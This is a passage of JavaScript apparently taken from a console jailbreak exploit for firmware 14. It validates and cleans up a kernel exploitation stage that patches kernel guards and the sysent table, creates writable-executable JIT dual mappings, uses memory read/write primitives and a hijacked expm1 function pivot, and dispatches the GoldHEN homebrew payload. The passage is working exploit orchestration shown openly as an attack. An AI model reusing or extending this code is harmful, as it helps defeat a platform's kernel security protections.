        "currentObjectsAuthenticated",
        "handlerSemanticAttested",
        "mmapCapabilityRecheckAttested",
        "dwordGadgetAttested",
        "ownerRevalidated",
        "writerIsolationVerified",
        "leaseStatus",
        "leaseWrites",
        "leaseCreateCalls",
        "leaseMapCalls",
        "leaseWriteArmConfirmed",
        "leaseWriteRestoreConfirmed",
        "leaseExecuteArmConfirmed",
        "leaseExecuteRestoreConfirmed",
        "leaseBorrowedBitsCleared",
        "leaseTerminalMatchesOriginal",
        "jitDescriptorCreated",
        "jitDescriptorReleased",
        "jitWritableMappingCreated",
        "jitExecutableMappingCreated",
        "jitMappingsCapabilityBound",
        "jitMappingsReleased",
        "wxPatchMappingVerified",
        "crossViewPatchVerified",
        "patchCopyVerified",
        "henRwxMapCreated",
        "henCopyVerified",
        "bssTailVerified",
        "henMappingRetained",
        "stockGuardsVerified",
        "patchedGuardsVerified",
        "patchExecutionAttempted",
        "bridgeCallbackRestored",
        "sysent11Restored",
        "goldhenLaunchAttempted",
        "goldhenLaunchDispatched",
        "goldhenRuntimeObserved",
        "exploitRetired",
      ];
      const actualKeys =
        hxResult && typeof hxResult === "object" ? Object.keys(hxResult) : [];
      const goldhenBooleanKeys = [
        "handlerSemanticAttested","mmapCapabilityRecheckAttested","dwordGadgetAttested",
        "ownerRevalidated","writerIsolationVerified","leaseWriteArmConfirmed",
        "leaseWriteRestoreConfirmed","leaseExecuteArmConfirmed","leaseExecuteRestoreConfirmed",
        "leaseBorrowedBitsCleared","leaseTerminalMatchesOriginal",
        "jitDescriptorCreated","jitDescriptorReleased","jitWritableMappingCreated",
        "jitExecutableMappingCreated","jitMappingsCapabilityBound","jitMappingsReleased",
        "wxPatchMappingVerified","crossViewPatchVerified","patchCopyVerified",
        "henRwxMapCreated","henCopyVerified","bssTailVerified","henMappingRetained",
        "patchExecutionAttempted","bridgeCallbackRestored","sysent11Restored",
        "goldhenLaunchAttempted","goldhenLaunchDispatched","goldhenRuntimeObserved",
        "exploitRetired","aioCleanupVerified","quarantined","stageCleanupVerified",
        "hostCleanupVerified","cleanupVerified",
      ];
      const goldhenSemanticBase = Boolean(
        hxResult &&
        hxResult.oracleAttempted &&
        hxResult.oracleCode === "OK_CURRENT_OWNER" &&
        !hxResult.oracleKernelMutated &&
        hxResult.oracleCleanup &&
        !hxResult.oracleRebootRequired &&
        hxResult.oracleExecutions === 2 &&
        hxResult.oracleSignatureVerified &&
        hxResult.oracleRopReadOnly &&
        hxResult.oracleAuthorityConsumed &&
        hxResult.currentObjectsAuthenticated &&
        hxResult.oracleDiagnosticReason === "none" &&
        hxResult.oracleSignatureChecks === 4 &&
        hxResult.oracleRoundsStarted === 2 &&
        hxResult.oracleRoundsCompleted === 2 &&
        hxResult.handlerSemanticAttested &&
        hxResult.mmapCapabilityRecheckAttested &&
        hxResult.dwordGadgetAttested
      );
      const goldhenConsumedSemanticProof = Boolean(
        goldhenSemanticBase &&
        ["authority-consumed","oracle-complete"].includes(
          hxResult.oracleDiagnosticPhase,
        )
      );
      const goldhenSemanticProof = Boolean(
        goldhenSemanticBase &&
        hxResult.oracleDiagnosticPhase === "oracle-complete"
      );
      const goldhenLeaseProof = Boolean(
        goldhenSemanticProof &&
        hxResult.ownerRevalidated &&
        hxResult.writerIsolationVerified &&
        hxResult.leaseStatus === "OK" &&
        hxResult.leaseWrites === 4 &&
        hxResult.leaseCreateCalls === 1 &&
        hxResult.leaseMapCalls === 1 &&
        hxResult.leaseWriteArmConfirmed &&
        hxResult.leaseWriteRestoreConfirmed &&
        hxResult.leaseExecuteArmConfirmed &&
        hxResult.leaseExecuteRestoreConfirmed &&
        hxResult.leaseBorrowedBitsCleared &&
        hxResult.leaseTerminalMatchesOriginal &&
        hxResult.jitDescriptorCreated
      );
      const goldhenPatchPrerequisites = Boolean(
        goldhenLeaseProof &&
        hxResult.jitWritableMappingCreated &&
        hxResult.jitExecutableMappingCreated &&
        hxResult.jitMappingsCapabilityBound &&
        hxResult.wxPatchMappingVerified &&
        hxResult.crossViewPatchVerified &&
        hxResult.patchCopyVerified &&
        hxResult.stockGuardsVerified === 24
      );
      const goldhenPatchCompletion = Boolean(
        goldhenPatchPrerequisites &&
        hxResult.patchExecutionAttempted &&
        hxResult.bridgeCallbackRestored &&
        hxResult.sysent11Restored &&
        hxResult.patchedGuardsVerified === 24 &&
        hxResult.jitMappingsReleased &&
        hxResult.jitDescriptorReleased &&
        hxResult.aioCleanupVerified
      );
      const goldhenLaunchPrerequisites = Boolean(
        goldhenPatchCompletion &&
        hxResult.exploitRetired &&
        hxResult.henRwxMapCreated &&
        hxResult.henCopyVerified &&
        hxResult.bssTailVerified
      );
      const goldhenDispatchProof = Boolean(
        goldhenLaunchPrerequisites &&
        hxResult.goldhenLaunchAttempted &&
        hxResult.goldhenLaunchDispatched
      );
      const goldhenSuccessProof = Boolean(
        goldhenDispatchProof &&
        hxResult.henMappingRetained &&
        hxResult.stageCleanupVerified &&
        hxResult.cleanupVerified &&
        !hxResult.quarantined &&
        !hxResult.goldhenRuntimeObserved
      );
      const leasePhaseFields = [
        "leaseWriteArmConfirmed","leaseWriteRestoreConfirmed",
        "leaseExecuteArmConfirmed","leaseExecuteRestoreConfirmed",
        "leaseBorrowedBitsCleared","leaseTerminalMatchesOriginal",
      ];
      const leaseActivityPhaseFields = leasePhaseFields.slice(0, 4);
      const leaseTerminalProofFields = leasePhaseFields.slice(4);
      const leaseResourceFields = [
        "jitDescriptorCreated","jitDescriptorReleased",
        "jitWritableMappingCreated","jitExecutableMappingCreated",
        "jitMappingsCapabilityBound","jitMappingsReleased",
      ];
      const aggregateCleanupClaimed = Boolean(
        hxResult &&
        (hxResult.stageCleanupVerified ||
          hxResult.hostCleanupVerified ||
          hxResult.cleanupVerified)
      );
      const exactOkLeaseTuple = Boolean(
        goldhenSemanticProof &&
        hxResult &&
        hxResult.leaseStatus === "OK" &&
        hxResult.leaseWrites === 4 &&
        hxResult.leaseCreateCalls === 1 &&
        hxResult.leaseMapCalls === 1 &&
        leasePhaseFields.every((name) => hxResult[name] === true)
      );
      const zeroLeaseTuple = Boolean(
        hxResult &&
        hxResult.leaseWrites === 0 &&
        hxResult.leaseCreateCalls === 0 &&
        hxResult.leaseMapCalls === 0 &&
        leaseActivityPhaseFields.every((name) => hxResult[name] === false) &&
        leaseResourceFields.every((name) => hxResult[name] === false)
      );
      const writeLeasePhaseReached = Boolean(
        hxResult &&
        (hxResult.leaseWrites > 0 ||
          hxResult.leaseCreateCalls > 0 ||
          hxResult.leaseMapCalls > 0 ||
          leaseActivityPhaseFields.slice(0, 2).some((name) => hxResult[name]) ||
          leaseResourceFields.some((name) => hxResult[name]))
      );
      const executeLeasePhaseReached = Boolean(
        hxResult &&
        (hxResult.leaseWrites > 2 ||
          hxResult.leaseMapCalls > 0 ||
          leaseActivityPhaseFields.slice(2).some((name) => hxResult[name]) ||
          hxResult.jitExecutableMappingCreated)
      );
      const exactReachedLeaseRestore = Boolean(
        hxResult &&
        (!writeLeasePhaseReached ||
          (hxResult.leaseWriteArmConfirmed &&
            hxResult.leaseWriteRestoreConfirmed &&
            hxResult.leaseWrites >= 2)) &&
        (!executeLeasePhaseReached ||
          (hxResult.leaseExecuteArmConfirmed &&
            hxResult.leaseExecuteRestoreConfirmed &&
            hxResult.leaseWrites === 4)) &&
        (!(writeLeasePhaseReached || executeLeasePhaseReached) ||
          (hxResult.leaseBorrowedBitsCleared &&
            hxResult.leaseTerminalMatchesOriginal))
      );
      const createdJitResourcesReleased = Boolean(
        hxResult &&
        (!hxResult.jitDescriptorCreated || hxResult.jitDescriptorReleased) &&
        (!(hxResult.jitWritableMappingCreated ||
          hxResult.jitExecutableMappingCreated) ||
          hxResult.jitMappingsReleased)
      );
      const cleanLeaseError = Boolean(
        hxResult &&
        hxResult.leaseStatus === "ERROR" &&
        writeLeasePhaseReached &&
        exactReachedLeaseRestore &&
        createdJitResourcesReleased
      );
      const leaseActivity = Boolean(
        hxResult &&
        (hxResult.leaseWrites > 0 ||
          hxResult.leaseCreateCalls > 0 ||
          hxResult.leaseMapCalls > 0 ||
          leaseActivityPhaseFields.some((name) => hxResult[name] === true) ||
          leaseResourceFields.some((name) => hxResult[name] === true))
      );
      const dirtyLeaseState = Boolean(
        hxResult &&
        hxResult.quarantined &&
        !aggregateCleanupClaimed
      );
      const stageReleasedEveryCreatedJitResource = Boolean(
        hxResult &&
        (!hxResult.jitDescriptorCreated || hxResult.jitDescriptorReleased) &&
        (!(hxResult.jitWritableMappingCreated ||
          hxResult.jitExecutableMappingCreated) ||
          hxResult.jitMappingsReleased)
      );
      if (
        !hxResult ||
        !validOracleDiagnostics(hxResult) ||
        actualKeys.length !== resultKeys.length ||
        !actualKeys.every((name) => resultKeys.includes(name)) ||
        typeof hxResult.kbaseValidated !== "boolean" ||
        typeof hxResult.lowMapPolicyValidated !== "boolean" ||
        typeof hxResult.kvaSearchTreeAccepted !== "boolean" ||
        typeof hxResult.rotationExpectedOpsMatch !== "boolean" ||
        hxResult.schema !== "oms.fw14-hx1400-goldhen-dualmap.result.v1" ||
        hxResult.runId !== hxClaim.run_id ||
        hxResult.maxArms !== hxClaim.max_arms ||
        !Array.isArray(hxResult.armRecords) ||
        typeof hxResult.oracleAttempted !== "boolean" ||
        (hxResult.oracleCode !== null && typeof hxResult.oracleCode !== "string") ||
        typeof hxResult.oracleKernelMutated !== "boolean" ||
        typeof hxResult.oracleCleanup !== "boolean" ||
        typeof hxResult.oracleRebootRequired !== "boolean" ||
        !Number.isInteger(hxResult.oracleExecutions) ||
        hxResult.oracleExecutions < 0 ||
        hxResult.oracleExecutions > 2 ||
        typeof hxResult.oracleSignatureVerified !== "boolean" ||
        typeof hxResult.oracleRopReadOnly !== "boolean" ||
        typeof hxResult.oracleAuthorityConsumed !== "boolean" ||
        !ORACLE_DIAGNOSTIC_PHASES.includes(hxResult.oracleDiagnosticPhase) ||
        !ORACLE_DIAGNOSTIC_REASONS.includes(hxResult.oracleDiagnosticReason) ||
        !Number.isInteger(hxResult.oracleSignatureChecks) || hxResult.oracleSignatureChecks < 0 || hxResult.oracleSignatureChecks > 4 ||
        !Number.isInteger(hxResult.oracleRoundsStarted) || hxResult.oracleRoundsStarted < 0 || hxResult.oracleRoundsStarted > 2 ||
        !Number.isInteger(hxResult.oracleRoundsCompleted) || hxResult.oracleRoundsCompleted < 0 || hxResult.oracleRoundsCompleted > hxResult.oracleRoundsStarted ||
        typeof hxResult.currentObjectsAuthenticated !== "boolean" ||
        !goldhenBooleanKeys.every((name) => typeof hxResult[name] === "boolean") ||
        (hxResult.leaseStatus !== null && typeof hxResult.leaseStatus !== "string") ||
        (hxResult.leaseStatus !== null &&
          !["OK","REFUSED","QUARANTINED","ERROR"].includes(hxResult.leaseStatus)) ||
        (hxResult.leaseStatus !== null &&
          (!goldhenConsumedSemanticProof ||
            hxResult.stockGuardsVerified !== 24 ||
            !hxResult.writerIsolationVerified)) ||
        !Number.isInteger(hxResult.leaseWrites) ||
        hxResult.leaseWrites < 0 ||
        hxResult.leaseWrites > 4 ||
        !Number.isInteger(hxResult.leaseCreateCalls) ||
        hxResult.leaseCreateCalls < 0 ||
        hxResult.leaseCreateCalls > 1 ||
        !Number.isInteger(hxResult.leaseMapCalls) ||
        hxResult.leaseMapCalls < 0 ||
        hxResult.leaseMapCalls > 1 ||
        !Number.isInteger(hxResult.stockGuardsVerified) ||
        hxResult.stockGuardsVerified < 0 ||
        hxResult.stockGuardsVerified > 24 ||
        !Number.isInteger(hxResult.patchedGuardsVerified) ||
        hxResult.patchedGuardsVerified < 0 ||
        hxResult.patchedGuardsVerified > 24 ||
        hxResult.rebootRequired !== true ||
        (!hxResult.oracleAttempted &&
          (hxResult.oracleCode !== null ||
            hxResult.oracleKernelMutated ||
            hxResult.oracleCleanup ||
            hxResult.oracleRebootRequired ||
            hxResult.oracleExecutions !== 0 ||
            hxResult.oracleSignatureVerified ||
            hxResult.oracleRopReadOnly ||
            hxResult.oracleAuthorityConsumed ||
            hxResult.currentObjectsAuthenticated ||
            hxResult.oracleDiagnosticPhase !== "not-started" ||
            hxResult.oracleDiagnosticReason !== "none" ||
            hxResult.oracleSignatureChecks !== 0 ||
            hxResult.oracleRoundsStarted !== 0 ||
            hxResult.oracleRoundsCompleted !== 0)) ||
        (hxResult.oracleAttempted && hxResult.oracleDiagnosticPhase === "not-started") ||
        (hxResult.quarantined && hxResult.oracleAttempted && !hxResult.oracleCleanup && hxResult.oracleDiagnosticReason === "none") ||
        typeof hxResult.ok !== "boolean" ||
        typeof hxResult.code !== "string" ||
        hxResult.ok !==
          (hxResult.code ===
            "OK_GOLDHEN_DUALMAP_LAUNCH_DISPATCHED_REBOOT_REQUIRED") ||
        hxResult.handlerSemanticAttested !==
          hxResult.currentObjectsAuthenticated ||
        hxResult.mmapCapabilityRecheckAttested !==
          hxResult.currentObjectsAuthenticated ||
        hxResult.dwordGadgetAttested !==
          hxResult.currentObjectsAuthenticated ||
        hxResult.jitMappingsCapabilityBound !==
          (goldhenLeaseProof &&
            hxResult.jitWritableMappingCreated &&
            hxResult.jitExecutableMappingCreated) ||
        (hxResult.jitDescriptorReleased && !hxResult.jitDescriptorCreated) ||
        (hxResult.jitMappingsReleased &&
          !hxResult.jitWritableMappingCreated &&
          !hxResult.jitExecutableMappingCreated) ||
        (hxResult.jitDescriptorCreated && hxResult.leaseCreateCalls !== 1) ||
        (hxResult.jitWritableMappingCreated && !hxResult.jitDescriptorCreated) ||
        (hxResult.jitExecutableMappingCreated &&
          (!hxResult.jitDescriptorCreated ||
            !hxResult.jitWritableMappingCreated ||
            hxResult.leaseMapCalls !== 1)) ||
        ((hxResult.leaseCreateCalls === 1) !==
          hxResult.leaseWriteArmConfirmed) ||
        ((hxResult.leaseMapCalls === 1) !==
          hxResult.leaseExecuteArmConfirmed) ||
        (hxResult.leaseStatus === "OK" && !exactOkLeaseTuple) ||
        (hxResult.leaseStatus === "REFUSED" && !zeroLeaseTuple) ||
        (hxResult.leaseStatus === null &&
          (!zeroLeaseTuple ||
            leaseTerminalProofFields.some((name) => hxResult[name]))) ||
        (hxResult.leaseStatus === "QUARANTINED" && !dirtyLeaseState) ||
        (hxResult.leaseStatus === "ERROR" &&
          !cleanLeaseError &&
          !dirtyLeaseState) ||
        (leaseActivity &&
          !exactOkLeaseTuple &&
          !cleanLeaseError &&
          !dirtyLeaseState) ||
        ((hxResult.jitDescriptorCreated ||
          hxResult.jitWritableMappingCreated ||
          hxResult.jitExecutableMappingCreated) &&
          !createdJitResourcesReleased &&
          !dirtyLeaseState) ||
        (hxResult.leaseBorrowedBitsCleared &&
          !hxResult.leaseWriteRestoreConfirmed &&
          !hxResult.leaseExecuteRestoreConfirmed) ||
        (hxResult.leaseTerminalMatchesOriginal &&
          hxResult.leaseStatus !== "REFUSED" &&
          !hxResult.leaseWriteRestoreConfirmed &&
          !hxResult.leaseExecuteRestoreConfirmed) ||
        (hxResult.patchExecutionAttempted && !goldhenPatchPrerequisites) ||
        ((hxResult.bridgeCallbackRestored ||
          hxResult.sysent11Restored ||
          hxResult.patchedGuardsVerified > 0) &&
          !hxResult.patchExecutionAttempted) ||
        ((hxResult.henRwxMapCreated ||
          hxResult.henCopyVerified ||
          hxResult.bssTailVerified) &&
          (!goldhenPatchCompletion || !hxResult.exploitRetired)) ||
        (hxResult.exploitRetired &&
          hxResult.patchExecutionAttempted &&
          !goldhenPatchCompletion) ||
        (hxResult.exploitRetired &&
          !hxResult.patchExecutionAttempted &&
          !hxResult.stageCleanupVerified) ||
        (hxResult.goldhenLaunchAttempted && !goldhenLaunchPrerequisites) ||
        (hxResult.goldhenLaunchDispatched && !goldhenDispatchProof) ||
        (hxResult.henMappingRetained !== hxResult.goldhenLaunchDispatched) ||
        (hxResult.henRwxMapCreated &&
          !hxResult.goldhenLaunchDispatched &&
          !dirtyLeaseState) ||
        (hxResult.stageCleanupVerified &&
          (!stageReleasedEveryCreatedJitResource ||
            (hxResult.patchExecutionAttempted && !hxResult.exploitRetired) ||
            hxResult.quarantined)) ||
        hxResult.goldhenRuntimeObserved ||
        (hxResult.ok && !goldhenSuccessProof)
      )
        throw new Error("Hx1400 GoldHEN result schema invalid");
      const retainHxAuthority =
        hxResult.quarantined || !hxResult.stageCleanupVerified;
      fw14CleanupAttempted = true;
      let hostCleanupVerified = false;
      if (retainHxAuthority) {
        hxPrimitiveCleanupAttempted = true;
        quarantineHxPrimitive(
          "stage quarantine retained complete Hx host authority",
        );
        fw14CleanupIncomplete = true;
      } else {
        try {
          if (typeof fw14CommonCleanup !== "function")
            throw new Error("FW14 common cleanup helper unavailable");
          await fw14CommonCleanup();
          fw14HostCommonCleanupVerified = !mainArmed;
          if (!fw14HostCommonCleanupVerified)
            throw new Error("main pivot remained armed after cleanup");
          if (!withdrawHxPrimitive())
            throw new Error(
              hxPrimitiveCleanupReason || "primitive withdrawal did not verify",
            );
          hostCleanupVerified = true;
        } catch (cleanupError) {
          mark(
            "FW14-HX1400-GOLDHEN-HOST-CLEANUP-FAIL",
            (cleanupError && cleanupError.message) || String(cleanupError),
          );
        }
      }
      fw14CleanupIncomplete =
        fw14CleanupIncomplete ||
        !hostCleanupVerified ||
        !hxResult.stageCleanupVerified;
      hxResult = finalizeHx1400GoldhenDualmapHostCleanup(
        hxResult,
        hostCleanupVerified,
      );
      const serializedHxResult = JSON.stringify(hxResult);
      if (/0x[0-9a-f]{8,16}/i.test(serializedHxResult))
        throw new Error("Hx1400 GoldHEN result contains a serialized address");
      hxResultFinalizedLocally = true;
      mark(
        "FW14-HX1400-GOLDHEN-LOCAL-FINAL",
        "run=" + hxClaim.run_id + " ok=" + (hxResult.ok ? "1" : "0") +
          " cleanup=" + (hxResult.cleanupVerified ? "1" : "0"),
      );
      allDone = hxResult.ok;
      fw14CleanupIncomplete = !hxResult.cleanupVerified;
      if (!hxResult.ok) fw14TerminalError = hxResult.code;
      state(
        hxResult.ok
          ? "GoldHEN launch dispatched; runtime readiness is unobserved; cold reboot now"
          : "GoldHEN dual-map successor stopped; cold reboot before any further attempt",
        hxResult.ok ? "ok" : "warn",
      );
      return;
    }

    // This dedicated route returns above; legacy privilege and payload paths are intentionally absent.

  } catch (e) {
    mark(
      fw14Kdump
        ? "FW14-KDUMP-FAIL"
        : fw14Hx
          ? "FW14-HX1400-GOLDHEN-FAIL"
          : "THREW",
      e && e.message ? e.message : String(e),
    );
    if (fw14Kdump || fw14Hx)
      fw14TerminalError = e && e.message ? e.message : String(e);
    state(
      fw14Kdump || fw14Hx ? "Failed; cold reboot before another attempt" : "threw",
      "bad",
    );
  } finally {
    restorePublicPrimitive();
    restoreNativeCtor();
    if (fw14Hx && primitiveCarrier !== null && !fw14CleanupAttempted) {
      fw14CleanupAttempted = true;
      hxPrimitiveCleanupAttempted = true;
      quarantineHxPrimitive(
        "stage result unavailable; retained complete Hx host authority",
      );
      fw14CleanupIncomplete = true;
    }
    if ((fw14Kdump || fw14Hx) && mainArmed) {
      const cleanupResult = await finishFw14AttemptCleanup({
        mainArmed,
        cleanupAlreadyAttempted: fw14CleanupAttempted,
        aioCleanup: fw14AioCleanup
          ? async () => {
              await fw14AioCleanup();
              if (fw14AioCleanup)
                throw new Error("FW14 AIO cleanup did not retire");
            }
          : null,
        commonCleanup: fw14CommonCleanup,
        emit: mark,
        setState: state,
      });
      fw14CleanupIncomplete =
        fw14CleanupIncomplete || cleanupResult.incomplete;
    }
    try {
      if (jbRestoreHook) jbRestoreHook("finally");
    } catch (e5) {
      mark("JB-RESTORE-THREW", (e5 && e5.message) || String(e5));
    }
    if (fw14Leak2 && leak2ArmAttempted) {
      mark(
        "LEAK2-WORKERS-RETAINED",
        "race entered; no worker RPC, vector restoration, affinity syscall or termination",
      );
    } else if (
      shouldRunLegacyWorkerCleanup({
        fw14Leak2,
        fw14Kdump: fw14Kdump || fw14Hx,
        mainArmed,
        commonCleanup: fw14CommonCleanup,
        aioCleanup: fw14AioCleanup,
      })
    ) {
      if (!restoreManagedWorker) {
        mark("FW14-WORKER-RESTORE-FAIL", "cleanup helper unavailable");
      }
      for (const worker of restoreManagedWorker ? managedWorkers : []) {
        if (worker.terminated) continue;
        try {
          await restoreManagedWorker(worker, fw14Kdump || fw14Hx);
          mark(
            fw14Kdump || fw14Hx
              ? "FW14-WORKER-RESTORE"
              : "LEAK2-WORKER-DISARM",
            worker.name +
              " pivot/vector verified" +
              (fw14Kdump || fw14Hx ? " and terminated" : ""),
          );
        } catch (e) {
          mark(
            fw14Kdump || fw14Hx
              ? "FW14-WORKER-RESTORE-FAIL"
              : "LEAK2-WORKER-INCOMPLETE",
            worker.name + " " + String(e),
          );
        }
      }
    }
    try {
      if (fw14Kdump && fw14AioCleanup) {
        mark(
          "FW14-LIVE-AIO-RETAINED",
          "descriptors, pivots, affinity and buffers retained for reboot safety",
        );
      } else if (fw14Leak2 && opened.length) {
        mark("LEAK2-FDS-RETAINED", opened.length +
          " descriptors; FW14 terminal/fdrop safety unverified; manual reboot required");
      } else if (
        opened.length &&
        closeFd &&
        mainArmed &&
        (!(fw14Kdump || fw14Hx) || !fw14CommonCleanup)
      ) {
        let n = 0;
        for (const fd of opened) if (closeFd(fd) === 0) n++;
        mark("STRAGGLERS-CLOSED", n + "/" + opened.length);
      }
    } catch (e3) {
      mark("CLOSE-THREW", (e3 && e3.message) || String(e3));
    }
    try {
      if (
        pinRestore &&
        !(fw14Leak2 && leak2ArmAttempted) &&
        !(fw14Kdump && fw14AioCleanup) &&
        (!(fw14Kdump || fw14Hx) || !fw14CommonCleanup)
      )
        pinRestore();
    } catch (e4) {
      mark("PIN-RESTORE-THREW", (e4 && e4.message) || String(e4));
    }
    try {
      if (
        mainArmed &&
        mainMf &&
        mainOrig &&
        p &&
        !(fw14Kdump && fw14AioCleanup) &&
        (!(fw14Kdump || fw14Hx) || !fw14CommonCleanup)
      ) {
        p.write8(mainMf, mainOrig);
        if (fw14Leak2 || fw14Kdump || fw14Hx) {
          const back = p.read8(mainMf);
          if (back.low !== mainOrig.low || back.hi !== mainOrig.hi)
            throw new Error("main m_function restoration did not verify");
        }
        mainArmed = false;
        mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
      }
    } catch (e2) {
      mark("DISARM-THREW", (e2 && e2.message) || String(e2));
    }

    if (fw14Hx && primitiveCarrier !== null && !hxPrimitiveCleanupAttempted) {
      if (!withdrawHxPrimitive()) fw14CleanupIncomplete = true;
    }
    if (fw14Hx && primitiveCarrier !== null && !hxPrimitiveWithdrawn) {
      quarantineHxPrimitive(
        hxPrimitiveCleanupReason || "primitive retained because cleanup was not verified",
      );
      fw14CleanupIncomplete = true;
    }

    try {
      if (typeof A !== "undefined" && A) A.busy = 0;
    } catch (e) {}
    if (fw14Hx && hxClaim && !hxResultFinalizedLocally) {
      mark(
        "FW14-HX1400-GOLDHEN-LOCAL-TERMINAL",
        "run=" + hxClaim.run_id +
          " finalized=0 cleanup=" + (fw14CleanupIncomplete ? "incomplete" : "complete") +
          " detail=" + (fw14TerminalError || "stage ended without a validated local result"),
      );
    }
    mark(
      "PROOF-SUMMARY-FINAL",
      "pass=" +
        passCount +
        " fail=" +
        failCount +
        (allDone ? "" : "  INCOMPLETE"),
    );
    try {
      finishUI(
        fw14Hx
          ? allDone &&
              failCount === 0 &&
              hxResult &&
              hxResult.hostCleanupVerified &&
              !fw14CleanupIncomplete &&
              hxResult.rebootRequired
          : false,
      );
    } catch (eUI) {}
    restorePublicPrimitive();
    restoreNativeCtor();
  }
}
